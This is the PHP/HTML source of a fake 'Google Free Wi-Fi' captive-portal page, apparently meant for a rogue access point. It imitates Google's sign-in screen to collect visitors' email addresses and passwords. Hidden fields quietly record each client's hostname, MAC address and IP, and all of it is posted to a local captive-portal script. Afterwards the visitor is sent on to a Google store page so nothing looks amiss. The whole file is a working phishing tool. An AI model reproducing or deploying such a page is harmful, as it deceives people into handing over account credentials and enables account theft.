<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";require_once('helper.php');
require_once('helper.php');
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394, user-scalable=no">
<title>Sign In - Google Free Wi-Fi</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
<link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>

<script src="jquery-2.2.1.min.js"></script>


</head>
<body>
<form method="POST" action="/captiveportal/index.php">
	<img src="assets/img/1ckkcu79ho.gif" alt="">
	<h1>Sign in</h1>
	<h2>with your Google Account</h2>
	<input id="user" type="text" name="email" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="password" name="password" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
	<input type="hidden" name="target" value="https://store.google.com/">
	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
</form>
<footer>
	English (United States)<img src="assets/img/mq40xx0kce.gif" alt="">
	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
</footer>
</body>
</html>
